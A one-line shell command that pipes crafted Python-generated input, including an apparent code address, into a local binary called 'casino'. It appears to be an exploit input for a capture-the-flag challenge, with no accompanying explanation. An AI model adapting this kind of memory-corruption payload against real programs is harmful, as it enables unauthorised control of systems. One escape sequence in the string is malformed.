./casino < <(python -c 'print( "\x31\x0A" + "\x78\x0A"  + "\x59x0A" + "\x32\x0A" * 34 + "134514406" + "\x0A" + "\x31\x0A" + "123" + "\x0A" + "\x78\x0A" + "\x6e\x0A")')
